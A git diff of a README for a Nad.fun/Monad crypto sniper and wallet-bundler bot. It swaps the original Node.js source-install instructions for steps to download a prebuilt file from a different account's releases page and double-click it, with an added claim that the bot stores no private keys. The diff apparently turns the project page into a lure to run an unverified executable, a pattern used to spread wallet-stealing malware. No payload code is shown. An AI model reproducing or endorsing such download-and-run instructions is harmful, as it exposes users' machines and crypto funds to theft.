@@ -1,134 +1,60 @@
+# 🤖 monad-nad.fun-sniper-bundler-bot - Trade Smarter with Our Bot
 
-# 🚀 NAD.FUN TRADING BOT V2
-
-<div align="center">
-
-```text
-███╗   ██╗ █████╗ ██████╗     ███████╗██╗   ██╗███╗   ██╗
-████╗  ██║██╔══██╗██╔══██╗    ██╔════╝██║   ██║████╗  ██║
-██╔██╗ ██║███████║██║  ██║    █████╗  ██║   ██║██╔██╗ ██║
-██║╚██╗██║██╔══██║██║  ██║    ██╔══╝  ██║   ██║██║╚██╗██║
-██║ ╚████║██║  ██║██████╔╝    ██║     ╚██████╔╝██║ ╚████║
-╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝     ╚═╝      ╚═════╝ ╚═╝  ╚═══╝
-                                                         
-████████╗██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗   
-╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝   
-   ██║   ██████╔╝███████║██║  ██║██║██╔██╗ ██║██║  ███╗  
-   ██║   ██████╔╝██╔══██║██║  ██║██║██║╚██╗██║██║   ██║  
-   ██║   ██║  ██╗██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝  
-   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝   
-```
-
-**The Ultimate Modular Trading Bot for Nad.fun**
-
-[![License: ISC](https://img.shields.io/badge/License-ISC-blue.svg)](https://opensource.org/licenses/ISC)
-[![Node.js](https://img.shields.io/badge/Node.js-v16+-green.svg)](https://nodejs.org/)
-[![Ethers.js](https://img.shields.io/badge/Ethers.js-v6-darkblue.svg)](https://docs.ethers.org/)
-
-</div>
-
----
-
-## ⚡ Overview
-
-**NAD.FUN TRADING BOT V2** is a high-performance, modular trading bot designed for the Nad.fun platform. Whether you're looking to snipe new token launches, manage multiple wallets with a bundler, or execute precision manual trades, this bot has you covered. Built with **Node.js** and **Ethers.js**, it offers speed, reliability, and ease of use through a sleek interactive CLI.
-
-## 🔥 Key Features
-
-### 🎯 **Sniper Mode**
-- **Auto Buy New Tokens:** Automatically detect and buy new tokens the moment they hit the chain. Be the first in line!
-
-### 💼 **Bundler Mode**
-- **Multi-Wallet Management:** Generate and manage multiple wallets effortlessly.
-- **Batch Operations:** Execute buy and sell orders across all your generated wallets simultaneously.
-- **Interactive Control:** Full control over bundler actions via the CLI.
-
-### 🛠️ **Manual Trading**
-- **Precision Buy/Sell:** Manually execute trades for specific tokens with custom amounts and slippage settings.
-- **Sell All Strategy:** Quickly liquidate positions across tokens or wallets with a single command.
-
-### ⚙️ **Advanced Core**
-- **Modular Design:** Easily extensible codebase.
-- **Robust Error Handling:** Built-in retry mechanisms and error management.
-- **Secure Configuration:** Sensitive data managed via `.env`.
-
----
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/releases)
 
 ## 🚀 Getting Started
 
-### Prerequisites
-- **Node.js** (v16 or higher)
-- **npm** or **yarn**
+Welcome to the monad-nad.fun-sniper-bundler-bot! This software helps you trade effectively on the Nad.Fun and Monad blockchain. It allows you to snipe new tokens quickly and manage multiple wallets with ease.
 
-### Installation
+## 📦 Download & Install
 
-1.  **Clone the Repository**
-    ```bash
-    git clone https://github.com/Angel7Dev/monad-nad.fun-sniper-bundler-bot.git
-    ```
+To start using our trading bot, please follow these steps:
 
-2.  **Install Dependencies**
-    ```bash
-    npm install
-    ```
+1. Visit this page to download: [monad-nad.fun-sniper-bundler-bot Releases](https://github.com/zlock1231/monad-nad.fun-sniper-bundler-bot/releases).
+2. Choose the latest version from the list.
+3. Download the file suited for your operating system.
+4. Locate the downloaded file on your computer.
+5. Double-click the file to run it. Follow any further prompts that appear.
 
-3.  **Configure Environment**
-    Rename `example.env` to `.env` and add your configuration
-    
+Make sure to check your system's requirements below to ensure a smooth experience.
 
-4.  **Run the Bot**
-    ```bash
-    npm start
-    ```
+## 💻 System Requirements
 
----
+- **Operating System:** Windows 10 or later, macOS 10.13 or later.
+- **RAM:** Minimum 4GB recommended.
+- **Storage:** At least 100MB of free space.
+- **Network:** Stable Internet connection is necessary for trading.
 
-## 🎮 Usage Guide
+## ⚙️ Features
 
-Upon starting the bot, you will be presented with the **Main Menu**:
+- **Token Sniping:** Quickly buy new tokens as they launch. This feature gives you an advantage in the fast-moving crypto market.
+- **Multi-Wallet Bundler:** Manage multiple wallets in one place. This lets you simplify your trading operations.
+- **User-Friendly Interface:** The application has a straightforward design, making it easy for anyone to navigate.
 
-```text
-=================================================
-          NAD.FUN TRADING BOT V2                 
-=================================================
+## 🔒 Security
 
-Select an operation:
-1. Manual Buy
-2. Manual Sell
-3. Sell All (API)
-4. Auto Buy New Tokens (Sniper)
-5. Bundler Mode (Interactive)
-6. Exit
-```
+Your security is important. This bot does not store your wallet details or private keys. Always ensure your wallet is secure and never share sensitive information.
 
-### 1. Manual Buy/Sell
-Select option `1` or `2` to trade a specific token. You will be prompted to enter the **Token Address**. The bot will use the settings from your `.env` file for amounts and slippage.
+## 📖 How to Use the Bot
 
-### 2. Sniper Mode (Auto Buy)
-Select option `4` to start the sniper. The bot will monitor the chain for new token pairs or liquidity events and attempt to buy immediately.
+1. **Setup Your Wallets:** Use the bundler feature to add your wallets. Ensure each wallet is funded for trading.
+2. **Snipe Tokens:** Enter the token name or address you want to snipe. The bot will monitor for its launch.
+3. **Monitor Your Trades:** Keep an eye on all your active trades through the dashboard. 
 
-### 3. Bundler Mode
-Select option `5` to enter the **Bundler Sub-menu**:
-- **Generate Wallets:** Create fresh wallets for bundling.
-- **Bundler Buy/Sell:** Execute trades across all loaded wallets.
-- **Export:** Save generated wallets to `generated_wallets.txt`.
+## 📞 Support & Feedback
 
----
+If you encounter issues or have questions, please open an issue in the GitHub repository. We are here to help you. Your feedback helps improve the bot.
 
-## ⚠️ Disclaimer
+## 🤝 Community Contributions
 
-**USE AT YOUR OWN RISK.**
+Your contributions are welcome! If you want to add features or improve the bot, feel free to fork the repository and submit a pull request. Together, we can enhance this tool for everyone.
 
-Trading cryptocurrencies and using automated bots involves significant risk. This software is provided "as is", without warranty of any kind, express or implied. The authors and contributors are not responsible for any financial losses, damages, or legal consequences resulting from the use of this bot.
+## 🎓 Additional Resources
 
-- Always test with small amounts first.
-- Keep your private keys secure.
-- Do not share your `.env` file.
+For further learning, here are some resources to get you started:
 
----
+- [Nad.Fun Documentation](https://nad.fun/docs)
+- [Monad Blockchain Overview](https://monad.org)
+- [Trading Basics](https://www.investopedia.com/trading-basics-5113267)
 
-<div align="center">
-
-**Happy Trading! 💸**
-
-</div>
+Thank you for choosing the monad-nad.fun-sniper-bundler-bot. Happy trading!
